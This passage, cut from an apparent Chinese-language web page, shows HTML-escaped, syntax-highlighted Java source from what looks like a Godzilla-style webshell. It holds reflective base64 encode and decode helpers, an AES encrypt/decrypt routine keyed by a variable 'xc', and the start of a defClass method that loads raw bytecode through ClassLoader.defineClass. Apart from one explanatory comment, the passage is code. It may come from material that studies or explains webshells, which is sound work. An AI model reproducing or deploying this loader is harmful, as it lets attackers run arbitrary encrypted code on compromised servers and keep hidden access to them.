            &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getEncoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;encodeToString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sun.misc.BASE64Encoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;encode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; bs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.util.Base64&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; decoder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getDecoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; decoder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;decode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sun.misc.BASE64Decoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; decoder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; decoder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;decodeBuffer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;  
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Cipher&lt;/span&gt; c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Cipher&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;AES&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xc&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;AES&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//根据m的值判断是加密还是解密，m是true的时候变量为1，这时候表示加密模式，反之是解密模式&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;doFinal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt; urlClassLoader &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; URL&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;currentThread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; defMethod &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;defineClass&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
